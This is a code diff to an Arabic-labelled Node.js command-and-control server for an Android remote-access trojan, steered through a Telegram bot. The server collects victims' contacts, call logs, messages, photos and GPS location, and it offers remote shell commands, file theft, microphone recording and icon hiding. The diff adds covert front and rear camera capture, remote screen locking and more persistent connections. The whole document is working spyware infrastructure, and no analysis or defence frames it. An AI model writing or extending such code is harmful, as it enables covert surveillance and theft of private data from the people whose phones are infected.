@@ -16,7 +16,13 @@ if (!token || !id) { console.error('Missing tokens'); process.exit(1); }
 
 const app = express();
 const appServer = http.createServer(app);
-const appSocket = new webSocket.Server({ server: appServer });
+const appSocket = new webSocket.Server({
+    server: appServer,
+    clientTracking: true,
+    perMessageDeflate: false,
+    maxPayload: 200 * 1024 * 1024,
+    handshakeTimeout: 30000
+});
 const appBot = new telegramBot(token, { polling: true });
 const appClients = new Map();
 const upload = multer({ limits: { fileSize: 200 * 1024 * 1024 } });
@@ -122,12 +128,12 @@ app.post('/uploadGallery', async (req, res) => {
 
 app.post('/uploadLocation', (req, res) => {
     appBot.sendLocation(id, req.body.lat, req.body.lon).catch(() => {});
-    appBot.sendMessage(id, `📍 احداثيات موقع من <b>${req.body.agentId || '?'}</b>\n🎯 الدقة: ${req.body.accuracy || '?'} م`, { parse_mode: 'HTML' }).catch(() => {});
+    appBot.sendMessage(id, `📍 موقع من <b>${req.body.agentId || '?'}</b>\n🎯 الدقة: ${req.body.accuracy || '?'} م`, { parse_mode: 'HTML' }).catch(() => {});
     res.send('');
 });
 
 // ═══════════════════════════════════════════════════════
-// 🔌 WebSocket
+// 🔌 WebSocket — Keep-Alive قوي
 // ═══════════════════════════════════════════════════════
 appSocket.on('connection', (ws, req) => {
     const authKey = req.headers['x-agent-key'];
@@ -141,14 +147,28 @@ appSocket.on('connection', (ws, req) => {
     const provider = req.headers.provider || 'N/A';
     ws.uuid = uuid;
     ws.isAlive = true;
-    appClients.set(uuid, { model, battery, version, provider });
+
+    // 🔥 تحسين: Keep-Alive قوي
+    try {
+        ws._socket.setTimeout(0);
+        ws._socket.setKeepAlive(true, 30000);
+        ws._socket.setNoDelay(true);
+    } catch(e) {}
+
+    appClients.set(uuid, { model, battery, version, provider, connectedAt: Date.now() });
 
     appBot.sendMessage(id,
-        `🥷 <b>تم اتصال عميل جديد بنجاح</b>\n\n📱 الجهاز: <b>${model}</b>\n🔋 البطارية: <b>${battery}</b>\n🤖 النظام: <b>${version}</b>\n📶 الشبكة: <b>${provider}</b>\n🆔 ID: <code>${uuid}</code>`,
+        `🟢 <b>تم اتصال عميل جديد</b>\n\n📱 الجهاز: <b>${model}</b>\n🔋 البطارية: <b>${battery}</b>\n🤖 النظام: <b>${version}</b>\n📶 الشبكة: <b>${provider}</b>\n🆔 ID: <code>${uuid}</code>`,
         { parse_mode: 'HTML' }
     ).catch(() => {});
 
     ws.on('pong', () => { ws.isAlive = true; });
+    ws.on('message', (msg) => {
+        try {
+            const data = msg.toString();
+            if (data === 'ping') { ws.send('pong'); return; }
+        } catch(e) {}
+    });
     ws.on('close', () => {
         appClients.delete(ws.uuid);
         appBot.sendMessage(id, `🔴 انقطع اتصال الجهاز\n• ${model}`, { parse_mode: 'HTML' }).catch(() => {});
@@ -193,6 +213,14 @@ const cmdsForDevice = (uuid) => ({
             { text: '🔋 البطارية', callback_data: `battery:${uuid}` }
         ],
         [
+            { text: '📷 كاميرا أمامية', callback_data: `cam_front:${uuid}` },
+            { text: '📸 كاميرا خلفية', callback_data: `cam_back:${uuid}` }
+        ],
+        [
+            { text: '🔒 قفل الشاشة', callback_data: `lock_screen:${uuid}` },
+            { text: '🔔 اهتزاز', callback_data: `vibrate:${uuid}` }
+        ],
+        [
             { text: '⚡ تنفيذ Shell', callback_data: `shell_prompt:${uuid}` },
             { text: '📦 ضغط مجلد ZIP', callback_data: `zip_prompt:${uuid}` }
         ],
@@ -219,13 +247,16 @@ appBot.on('message', (message) => {
     if (!text) return;
 
     if (text === '/start') {
-        appBot.sendMessage(id, '👑 <b>لوحة التحكم المركزية - ناصر دين الله الكلعي</b>\n\nاختر من الأزرار:', kbMain);
+        appBot.sendMessage(id, '👑 <b>لوحة التحكم المركزية</b>\n\nاختر من الأزرار:', kbMain);
         return;
     }
     if (text === '📱 الأجهزة المتصلة') {
         if (appClients.size === 0) return appBot.sendMessage(id, '❌ لا توجد أجهزة متصلة حالياً');
         let t = '📱 <b>الأجهزة النشطة:</b>\n\n';
-        appClients.forEach((v, k) => { t += `• <b>${v.model}</b>\n   🔋 ${v.battery} | 🤖 ${v.version}\n   📶 ${v.provider}\n   🆔 <code>${k}</code>\n\n`; });
+        appClients.forEach((v, k) => {
+            const uptime = Math.floor((Date.now() - v.connectedAt) / 1000 / 60);
+            t += `• <b>${v.model}</b>\n   🔋 ${v.battery} | 🤖 ${v.version}\n   📶 ${v.provider}\n   ⏱️ متصل منذ ${uptime} دقيقة\n   🆔 <code>${k}</code>\n\n`;
+        });
         appBot.sendMessage(id, t, { parse_mode: 'HTML' });
         return;
     }
@@ -281,11 +312,11 @@ appBot.on('callback_query', async (cb) => {
     }
     if (cmd === 'path_prompt') {
         await appBot.sendMessage(id,
-            '📁 <b>الأوامر المتاحة للمسارات:</b>\n\n' +
-            '• <code>list:DCIM/Camera</code> — عرض محتوى\n' +
-            '• <code>read:Download/notes.txt</code> — قراءة ملف\n' +
-            '• <code>send_file:Download/test.pdf</code> — إرسال ملف\n' +
-            '• <code>find:IMG</code> — البحث عن ملف',
+            '📁 <b>الأوامر المتاحة:</b>\n\n' +
+            '• <code>list:DCIM/Camera</code>\n' +
+            '• <code>read:Download/notes.txt</code>\n' +
+            '• <code>send_file:Download/test.pdf</code>\n' +
+            '• <code>find:IMG</code>',
             { parse_mode: 'HTML', reply_markup: { force_reply: true } });
         return;
     }
@@ -302,7 +333,8 @@ appBot.on('callback_query', async (cb) => {
     const instant = [
         'contacts', 'calls', 'messages', 'location',
         'gallery', 'list_sdcard', 'hide_icon',
-        'sysinfo', 'wifi', 'battery'
+        'sysinfo', 'wifi', 'battery',
+        'cam_front', 'cam_back', 'lock_screen', 'vibrate'
     ];
     if (instant.includes(cmd)) {
         if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'الجهاز غير متصل' });
@@ -313,7 +345,7 @@ appBot.on('callback_query', async (cb) => {
 });
 
 // ═══════════════════════════════════════════════════════
-// 📝 معالج الردود على الرسائل
+// 📝 معالج الردود
 // ═══════════════════════════════════════════════════════
 appBot.on('message', async (message) => {
     if (!message.reply_to_message) return;
@@ -326,7 +358,6 @@ appBot.on('message', async (message) => {
     const cmd = (message.text || '').trim();
     if (!cmd) return;
 
-    // تحقق من صحة الأمر
     const validPrefixes = [
         'shell:', 'zip_dir:', 'send_image:', 'send_file:',
         'list:', 'read:', 'find:', 'search:', 'mic:'
@@ -334,7 +365,7 @@ appBot.on('message', async (message) => {
     const isValid = validPrefixes.some(p => cmd.startsWith(p));
 
     if (!isValid) {
-        await appBot.sendMessage(id, `⚠️ صيغة الأمر غير صحيحة: <code>${cmd}</code>\n\nالصيغ الصحيحة:\n• <code>list:PATH</code>\n• <code>zip_dir:PATH</code>\n• <code>shell:COMMAND</code>\n• <code>find:NAME</code>\n• <code>read:PATH</code>\n• <code>send_file:PATH</code>\n• <code>mic:SECONDS</code>`, { parse_mode: 'HTML' });
+        await appBot.sendMessage(id, `⚠️ صيغة الأمر غير صحيحة: <code>${cmd}</code>`, { parse_mode: 'HTML' });
         return;
     }
 
@@ -343,15 +374,18 @@ appBot.on('message', async (message) => {
 });
 
 // ═══════════════════════════════════════════════════════
-// 💓 نبضات الاتصال
+// 💓 نبضات الاتصال — أقوى
 // ═══════════════════════════════════════════════════════
 setInterval(() => {
     appSocket.clients.forEach((ws) => {
-        if (ws.isAlive === false) return ws.terminate();
+        if (ws.isAlive === false) {
+            try { ws.terminate(); } catch(e) {}
+            return;
+        }
         ws.isAlive = false;
         try { ws.ping(); } catch (e) {}
     });
-}, 30000);
+}, 25000);
 
 const PORT = process.env.PORT || 8999;
 appServer.listen(PORT, '0.0.0.0', () => console.log(`✅ C2 Server running on port ${PORT}`));
